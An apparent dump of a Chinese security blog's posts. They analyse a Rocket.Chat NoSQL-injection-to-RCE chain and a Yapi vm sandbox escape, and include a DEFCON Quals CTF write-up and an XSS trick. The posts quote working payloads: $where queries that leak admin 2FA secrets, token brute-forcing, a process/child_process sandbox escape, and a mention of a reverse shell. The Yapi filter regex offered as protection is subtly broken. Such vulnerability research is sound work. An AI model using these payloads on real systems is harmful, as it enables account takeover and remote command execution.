[{"title":"","url":"https://0727.site/Rocket.Chat RCE/","content":"Rocket.Chat 远程命令执行漏洞分析\ntitle: Rocket.Chat 远程命令执行漏洞分析date: 2021-07-27 17:00:00categories:\n\nJavaScript\nmongodbtags:\n漏洞分析\n\n\n文章首发于 paper.seebug.org。\n0x01 简述Rocket.Chat 是一个开源的完全可定制的通信平台，由 Javascript 开发，适用于具有高标准数据保护的组织。\n2021年3月19日，该漏洞在 HackerOne 被提出，于2021年4月14日被官方修复。该漏洞主要是因为 Mongodb 的查询语句是类 JSON 形式的，如&#123;&quot;_id&quot;:&quot;1&quot;&#125;。由于对用户的输入没有进行严格的检查，攻击者可以通过将查询语句从原来的字符串变为恶意的对象，例如&#123;&quot;_id&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;即可查询 _id 值不等于 1 的数据。\n影响版本3.12.1&lt;= Rocket.Chat &lt;=3.13.2\n0x02 复现复现环境为 Rocket.Chat 3.12.1。\n使用 pocsuite3 编写 PoC，利用 verify 模式验证。\n\n0x03 漏洞分析该漏洞包含了两处不同的注入，漏洞细节可以在这篇文章中找到，同时还可以找到文章作者给出的 exp。第一处在server/methods/getPasswordPolicy.js，通过 NoSQL 注入来泄露重置密码的 token。\ngetPasswordPolicy(params) &#123;\n\t\tconst user = Users.findOne(&#123; 'services.password.reset.token': params.token &#125;);\n\t\tif (!user &amp;&amp; !Meteor.userId()) &#123;\n\t\t\tthrow new Meteor.Error('error-invalid-user', 'Invalid user', &#123;\n\t\t\t\tmethod: 'getPasswordPolicy',\n\t\t\t&#125;);\n\t\t&#125;\n\t\treturn passwordPolicy.getPasswordPolicy();\n\t&#125;\n\n这里的 params 是用户传入的参数，正常来说，params.token 是一串随机字符串，但在这里可以传一个包含正则表达式的查询语句 &#123;&#39;$regex&#39;:&#39;^A&#39;&#125;，例如下面这个例子意为查找一处 token 是以大写字母 A 为开头的数据。通过这个漏洞就可以逐字符的爆破修改密码所需的 token。\nUsers.findOne(&#123; \n\t'services.password.reset.token': &#123;\n        '$regex': '^A'\n    &#125; \n&#125;)\n\n第二处漏洞在 app/api/server/v1/users.js，需要登陆后的用户才能访问，通过这处注入攻击者可以获得包括 admin 在内的所有用户的信息。注入点代码如下：\nAPI.v1.addRoute('users.list', &#123; authRequired: true &#125;, &#123;\n\tget() &#123;\n\t\t// ...\n\t\tconst &#123; sort, fields, query &#125; = this.parseJsonQuery();\n\t\tconst users = Users.find(query, &#123;/*...*/&#125;).fetch();\n\t\treturn API.v1.success(&#123;\n\t\t\tusers,\n\t\t\t// ...\n\t\t&#125;);\n\t&#125;,\n&#125;);\n\n这处注入需要了解的知识点是，mongo 中的 $where 语句，根据文档，查询语句以这种形式展现 &#123; $where: &lt;string|JavaScript Code&gt; &#125;，因此攻击者可以注入 JavaScript 代码，通过将搜索的结果以报错的形式输出。光说可能难以理解，通过一个例子就能很好地说明了。\n攻击者可以传入这样的 query：&#123;&quot;$where&quot;:&quot;this.username===&#39;admin&#39; &amp;&amp; (()=&gt;&#123; throw this.secret &#125;)()&quot;&#125;，就会构成下面这样的查询语句，意为查询 username 为 admin 的用户并将他的信息通过报错输出。\nUsers.find(\n\t&#123;\n\t\t\"$where\":\"this.username==='admin' &amp;&amp; (()=>&#123; throw JSON.stringify(this) &#125;)()\"\n\t&#125;, \n\t&#123;/*...*/&#125;\n).fetch();\n\n通过这个漏洞，就可以获得 admin 的修改密码的 token 和 2FA 的密钥，即可修改 admin 的密码，达到了提权的目的。Rocket.Chat 还为管理员账户提供了创建 web hooks 的功能，这个功能用到了 Node.js 的 vm 模块，而 vm 模块可以通过简单的原型链操作被逃逸，达到任意命令执行的效果。至此，我们了解到了这一个命令执行漏洞的所有细节，接下来就通过分析漏洞发现者提供的 exp 来讲一下漏洞利用的过程。\n0x04 漏洞利用这部分内容基于漏洞发现者给出的 exp，并结合我在复现过程中遇到的问题提出改进意见。\n# Getting Low Priv user\nprint(f\"[+] Resetting &#123;lowprivmail&#125; password\")\n## Sending Reset Mail\nforgotpassword(lowprivmail,target)\n\n## Getting reset token through blind nosql injection\ntoken = resettoken(target)\n\n## Changing Password\nchangingpassword(target,token)\n\n首先通过 getPasswordPolicy() 处的 token 泄露漏洞，修改普通用户的密码。然而需要注意的是，修改密码的 token 长度为 43 个字符，这个爆破的工作量是很大的，且耗时非常长。因此在获取普通用户权限这一步，可以直接通过注册功能完成，而不需要爆破验证的 token。试想若是攻击目标关闭了注册功能，那意味着我们无法获取到已注册用户的信息，也就无计可施了。\n# Privilege Escalation to admin\n## Getting secret for 2fa\nsecret = twofactor(target,lowprivmail)\n\n第二步是获取管理员账号的 2FA 密钥，其中的 twofactor() 利用了第二处漏洞。\ndef twofactor(url,email):\n\t# Authenticating\n\t# ...\n\tprint(f\"[+] Succesfully authenticated as &#123;email&#125;\")\n\n\t# Getting 2fa code\n\tcookies = &#123;'rc_uid': userid,'rc_token': token&#125;\n\theaders=&#123;'X-User-Id': userid,'X-Auth-Token': token&#125;\n\tpayload = '/api/v1/users.list?query=&#123;\"$where\"%3a\"this.username%3d%3d%3d\\'admin\\'+%26%26+(()%3d>&#123;+throw+this.services.totp.secret+&#125;)()\"&#125;'\n\tr = requests.get(url+payload,cookies=cookies,headers=headers)\n\tcode = r.text[46:98]\n\n在这个函数中直接默认了管理员账号的 username 为 “admin”，但是经过测试，并不是所有可攻击的目标都以 “admin” 作为 username，那么就需要一种方法来获取管理员账号的 username。观察 mongodb 中存储的用户数据：\n&#123;\n\t\"_id\" : \"x\", \n\t...\n\t\"services\" : &#123; \n\t\t\"password\" : &#123; \n\t\t\t...\n\t\t&#125;, \n\t\t...,\n\t\t\"emails\" : [ &#123; \n\t\t\t\"address\" : \"x@x.com\", \n\t\t\t\"verified\" : true\n\t\t&#125; ], \n\t\t\"roles\" : [ \"admin\" ], \n\t\t\"name\" : \"username\",\n    \t...\n&#125;\n\n每一个用户字段中都有一条&#123;&quot;roles&quot;:[&quot;&quot;]&#125;，通过&#123;&quot;$where&quot;:&quot;this.roles.indexOf(&#39;admin&#39;)&gt;=0&quot;&#125;来查询管理员账号的信息，随后便可获取管理员的 username。\n第三步是修改管理员账号的密码，以获得 admin 的权限。\n## Sending Reset mail\nprint(f\"[+] Resetting &#123;adminmail&#125; password\")\nforgotpassword(adminmail,target)\n\n## Getting admin reset token through nosql injection authenticated\ntoken = admin_token(target,lowprivmail)\n\n## Resetting Password\ncode = oathtool.generate_otp(secret)\nchangingadminpassword(target,token,code)\n\n其中 forgotpassword() 这一步不可缺少，因为每次通过 reset token 来修改密码以后，后台会自动删除该 token。在本地测试的时候，因为没有 forgotpassword() 这一步，所以每次执行过 changingadminpassword() 以后，都会因为缺少 reset token 导致下一次 PoC 执行失败。通过断点调试找到了问题所在。\n在.meteor/local/build/programs/server/packages/accounts-password.js line 1016\nresetPassword: function () &#123;\n    // ...\n\ttry &#123;\n        // Update the user record by:\n        // - Changing the password to the new one\n        // - Forgetting about the reset token that was just used\n        // - Verifying their email, since they got the password reset via email.\n        const affectedRecords = Meteor.users.update(&#123;\n            'services.password.reset.token': token\n        &#125;, &#123;\n            $unset: &#123;\n                'services.password.reset': 1,\n            &#125;\n        &#125;);\n    &#125;\n&#125;\n\n每一次执行 resetPassword() 以后，都会清空 token。同样在这个文件中，可以找到用于生成 reset.token 的函数 generateResetToken()。在此文件中共有三次出现，其中一次是函数定义，两次是调用，分别于第 898 行和第 938 行被 sendResetPasswordEmail() 和 sendEnrollmentEmail() 调用。\nAccounts.sendResetPasswordEmail = (userId, email, extraTokenData) => &#123;\n  const &#123;/*...*/&#125; = Accounts.generateResetToken(userId, email, 'resetPassword', extraTokenData);\n\nsendResetPasswordEmail() 在申请重置密码的时候被调用，sendEnrollmentEmail() 在用户刚注册的时候被调用。因此，想要获得 reset.token 的值，就要先发起一个重置密码的请求，让后台发送一封重置密码的邮件。\n最后一步就是执行任意命令了。\n## Authenticating and triggering rce\n\nwhile True:\n\tcmd = input(\"CMD:> \")\n\tcode = oathtool.generate_otp(secret)\n\trce(target,code,cmd)\n\n由于命令执行没有回显，因此我的做法是在本地监听一个端口起一个 HTTP 服务器，然后执行 wget HTTP服务器地址/$&#123;random_str&#125;，如果 HTTP 服务器收到了路由为 /$&#123;random_str&#125;的请求，则证明该服务存在漏洞。\n0x05 后记这次复现经过了挺长的时间，主要是由于这个漏洞利用的条件比较苛刻，需要满足各种限制条件，比如需要开放注册功能、管理员账号开启了 2FA、被攻击目标的版本满足要求。不过通过耐心的分析，把复现过程中遇到的问题一一解决，我还是很高兴的。\n0x06 防护方案1、更新 Rocket.Chat 至官方发布的最新版。\n0x07 相关链接1、Rocket.Chat\n2、pocsuite3\n3、NoSQL Injections in Rocket.Chat 3.12.1: How A Small Leak Grounds A Rocket\n4、Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) (2)\n5、mongo 文档\n","categories":[],"tags":[]},{"title":"Yapi 远程命令执行漏洞分析","url":"https://0727.site/Yapi1.9.2 RCE/","content":"文章首发于 paper.seebug.org。\n0x01 简述Yapi 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。\n2021年7月8日，有用户在 GitHub 上发布了遭受攻击的相关信息。攻击者通过注册用户，并使用 Mock 功能实现远程命令执行。命令执行的原理是 Node.js 通过 require(&#39;vm&#39;) 来构建沙箱环境，而攻击者可以通过原型链改变沙箱环境运行的上下文，从而达到沙箱逃逸的效果。通过 vm.runInNewContext(&quot;this.constructor.constructor(&#39;return process&#39;)()&quot;) 即可获得一个 process 对象。\n影响版本Yapi &lt;= 1.9.2 \n0x02 复现复现环境为 Yapi 1.9.2，Docker 环境已上传到 Dokcer Hub。\n攻击者通过注册功能注册一个新用户，在新建项目页面创建一个新项目。\n\n在设置 -&gt; 全局 mock 脚本中添加恶意代码。设置命令为反弹 shell 到远程服务器。\n\nPOC如下：\n\n随后添加接口，访问提供的 mock 地址。\n\n随后即可在远程服务器上收到来自命令执行反弹的 shell。\n\n0x03 漏洞分析在 Github 上发布的新版本 1.9.3 已经修复了这个漏洞。https://github.com/YMFE/yapi/commit/37f7e55a07ca1c236cff6b0f0b00e6ec5063c58e\n核心问题在server/utils/commons.js line 635\n\n修复后的代码引入了新的动态脚本执行模块 safeity，替换了原有的 vm 模块。根据 Node.js 官方的描述\n\n The vm module is not a security mechanism. Do not use it to run untrusted code.\n\nvm 模块并不是一个完全安全的动态脚本执行模块。先来看看 vm 有哪些执行命令的函数。\n\n根据官方文档，这三个函数都有一个参数 contextObject 用来表示上下文。但是这个上下文并不是完全隔离地运行的，可以通过原型链的形式实现沙箱逃逸。\n> vm.runInNewContext(\"this\")\n&#123;&#125; // this 是一个空对象\n\n> vm.runInNewContext(\"this.constructor\")\n[Function: Object] // 通过 this.constructor 可以获得一个对象的构造方法\n\n> vm.runInNewContext(\"this.constructor('a')\")\n[String: 'a'] // 获得了一个字符串对象\n\n> vm.runInNewContext(\"this.constructor.constructor('return process')\")\n[Function: anonymous] // 获得了一个匿名函数 function() &#123; return process; &#125;\n\n> vm.runInNewContext(\"this.constructor.constructor('return process')()\")\nprocess &#123;\n  title: 'node',\n  version: 'v10.19.0',\n  ...\n&#125; // 获得了一个 process() 函数的执行结果\n  // 接下来就可以通过 process.mainModule.require('chile_process').execSync('command') 来执行任意代码\n\n有一种防护方案是将上下文对象的原型链赋值成 null，就可以防止利用 this.constructor 进行沙盒逃逸。const contextObject = Object.create(null)，但是这种方法有个缺点，这样禁用了内置的函数，业务需求完全得不到实现。有文章Node.js沙盒逃逸分析提到可以用 vm.runInNewContext(&#39;&quot;a&quot;.constructor.constructor(&quot;return process&quot;)().exit()&#39;, ctx);绕过原型链为 null 的限制。测试后发现无效，如果不考虑业务需求的话，Object.create(null)应该是一种终极的解决方案了。\n接下来我们可以下断点跟进看看漏洞是如何被利用的。在server/utils/commons.js line 635处下断点，构造 mock 脚本，然后访问 mock 接口，程序运行停止在断点处。使用 F11 Step into 进入server/utils/conmmons.js处，单步调试至line 289，再用 F11 进入沙盒环境。\nconst sandbox = this // 将沙盒赋给了变量 sandbox\nconst process = this.constructor.constructor('return process')() // 利用原型链进行沙盒逃逸获得 process 对象\nmockJson = process.mainModule.require('child_process').execSync('whoami &amp;&amp; ps -ef').toString() // 给 sandbox.mockJson 赋值了命令执行的结果\n函数执行结束后会调用 context.mockJson = sandbox.mockJson 并将 mockJson 作为 req.body 返回用户，于是就可以在页面中看到命令执行的反馈。\n0x04 防护方案1、在 Mock 功能中加入对恶意代码的过滤。找到文件 api/common/postmanLib.js 的第178行，在函数 function sandboxByNode(sandbox = &#123;&#125;, script) 的开始添加一段过滤： const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;\n2、如果没有使用注册的需求，建议关闭 Yapi 的注册功能。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。\n3、如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能。\n0x05 相关链接1、高级Mock可以获取到系统操作权限2、Node.js命令执行和沙箱安全3、Node.js沙盒逃逸分析\n","categories":["JavaScript","De-Obfuscation"],"tags":["漏洞分析"]},{"title":"DEFCON2021 Quals threefactooorx","url":"https://0727.site/DEFCON Quals 2021 threefactooorx/","content":"反混淆插件源码的主要部分在 content_script.js， 但因为经过混淆，根本不是给人看的，于是得先反混淆。考虑到 js 本身就是解释型语言，我可以直接在 chrome devtools 中下断点，然后在 console 里打印我想要的变量值。最外层的函数不是特别多，所以依次下断点配合 devtools 的控制台获取变量。\n这段过程都是体力活，就不具体描述了，最后反混淆出了大致能看的 js 代码 readable_code.js。\n最后看下来，反混淆的部分是最重要的，因为后面的分析都不是很难。\n本地分析反混淆以后，可以看到在源码的最后有一段代码会定时向后台获取 flag 并输出。\nobserver[\"observe\"](document, config),\n    console[\"log\"](\"The observer is observing.\"),\n    setTimeout(function() &#123;\n      const _0xd26915 = &#123;&#125;;\n      _0xd26915[\"getflag\"] = _0x10b2d5[\"xOsuT\"], //true\n          chrome[\"runtime\"][\"sendMessage\"](_0xd26915, function(_0x336e82) &#123;\n            // _0x336382 is response from backend included with flag\n            FLAG = _0x336e82[\"flag\"],\n                console['log']((\"flag: \" + _0x336e82[\"flag\"]));\n\n            // four &amp;&amp; and display flag on the #thirdfactooor\n            nodesadded == 5 &amp;&amp; (nodesdeleted == 3) &amp;&amp; \\\n            attrcharsadded == 23 &amp;&amp; (domvalue == 2188) &amp;&amp; \\\n             (document[\"getElementById\"](\"thirdfactooor\")['value'] = _0x336e82[\"flag\"]);\n\n            // append new div\n            const _0x369bcb = document[\"createElement\"](\"div\");\n            _0x369bcb[\"setAttribute\"](\"id\", \"processed\"),\n                document[\"body\"][\"appendChild\"](_0x369bcb);\n          &#125;);\n    &#125;, 500);\n\n其中这个 document[&quot;getElementById&quot;](&quot;thirdfactooor&quot;) 是在 check_dom() 会进行的一项检查，我们需要让 html 中有一个 id 为 thirdfactooor 的 input 标签。\nif (document[\"querySelector\"](\"thirdfactooor\")[\"tagName\"] == \"INPUT\") &#123;&#125;\n\n只需要满足\nnodesadded == 5 &amp;&amp; (nodesdeleted == 3) &amp;&amp; attrcharsadded == 23 &amp;&amp; (domvalue == 2188)\n\n依次找到赋值的地方\n/*\n > _0x8a010b instanceof MutationRecord\n &lt;· true\n*/\nif (_0x8a010b[\"type\"] === \"childList\") &#123;\n    if (false) &#123;\n        // never execute\n    &#125; else &#123;\n        nodesadded += _0x8a010b[\"addedNodes\"][\"length\"],\n        nodesdeleted += _0x8a010b[\"removedNodes\"][\"length\"];\n    &#125;\n&#125; else &#123;\n    if ((_0x8a010b[\"type\"] === \"attributes\")) &#123;\n        if (true) &#123;\n            attrcharsadded += _0x8a010b[\"attributeName\"][\"length\"];\n        &#125;\n    &#125;\n&#125;\n在这里学习了一下 MutationRecode 的函数，MutationRecord JavaScript API。 type 会随着不同的操作改变\n\n改变 Node.childNodes 时会变成 childList\n改变  Element.attribute 时会变成 attributes\n\n按要求我们需要5次节点增加，3次节点移除，改变的属性名的长度总和为23。\n需要注意的是，在这段赋值操作前，有一处判断会导致程序提前退出。\nvar _0x5b12b9 = document[\"getElementById\"](\"3fa\");\n...\nif ((_0x8a010b[\"target\"] === _0x5b12b9) || \\\n_0x8a010b[\"target\"][\"parentNode\"] === _0x5b12b9 || \\\n_0x8a010b[\"target\"][\"parentNode\"][\"parentNode\"] === _0x5b12b9) &#123;&#125;\nelse return;\n\n所以 id 为 #3fa 的节点必须是根节点（可以直接给 &lt;html&gt; ）。\n接下来在调试的时候观察到 domvalue 与 .html 文件中的字数有关，凑足一定的字数即可。\n&lt;input id=\"thirdfactooor\" size=\"1000px\">\n&lt;script>\n    let fa = document.getElementsByTagName(\"html\")[0];\n    fa.setAttribute(\"id\", \"3fa\")\n    for(let i = 0; i &lt; 4; i++) &#123;\n        fa.lang = i; // 2 + 4 chars * 4 + 5\n    &#125;\n    let a = document.createElement(\"div\")\n    let b = document.createElement(\"div\")\n    let c = document.createElement(\"div\")\n    let d = document.createElement(\"div\")\n    let e = document.createElement(\"div\")\n    fa.appendChild(a)\n    fa.appendChild(b)\n    fa.appendChild(c)\n    fa.appendChild(d)\n    fa.appendChild(e)\n    fa.removeChild(a)\n    fa.removeChild(b)\n    fa.removeChild(c);\n    console.log(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\")\n&lt;/script>\n\n直接放在本地跑，成功\n\nCapture the flag远程服务提供了一个 /submit 接口，可以提交我们的 html 文件，然后会用类似给这个 html “拍照”的方式，以图片格式返回。期间， html 文件里的 js 代码都会执行，但是 alert() 会引起报错，基本排除了 XSS 的可能。直接上传，DONE!\n\n\n总结第一次解出国际赛的题目，当能 getflag 的时候手都在抖。总体过程还是反混淆最折磨人，代码的逻辑并不复杂，getflag 也不需要绕太多的弯，只要能把 js 恢复出来就成功了大半。\n","categories":["JavaScript","De-Obfuscation"],"tags":["DEFCON 2021 Quals","Writeup"]},{"title":"JS trick in XSS","url":"https://0727.site/JS trick in XSS/","content":"xss = \"javascript:alert(1)\";\n(&#123; xss: location &#125; = this);\n\n这里要提到解构赋值的概念，\n利用解构赋值，将属性/值从对象/数组中取出，并赋值给其他变量这里的圆括号是必须的\n\n于是我将问题提炼，问 kevin：(&#123;a:location&#125;=aa)为什么会使页面跳转？\n然后达成一致，是因为location的值发生了变化，然后浏览器强制刷新了。但我们关注到跳转后的页面后接的路由是根据a的值来的，有可能会出现/undefined的情况。\n然后这里我和 kevin 持两种不同的意见：\n我认为这里是因为首先根据&#123;a:location&#125;=this,把当前页面(this)的location赋值过去，然后根据a的值进行跳转。\nkevin 认为首先将this.a的值赋给了a.location，原因是a这个Object和window这个Object里都有a这个键。然后触发了解构赋值，a.location=this.a=&#39;javascript:alert(1)&#39;，最后成功触发了xss。\n关于poc可以看\n\n执行后的结果为：\n\n","categories":["JavaScript","XSS"],"tags":[]},{"title":"Start from scratch","url":"https://0727.site/Start from scratch/","content":"now I want a new start\n","categories":[],"tags":[]}]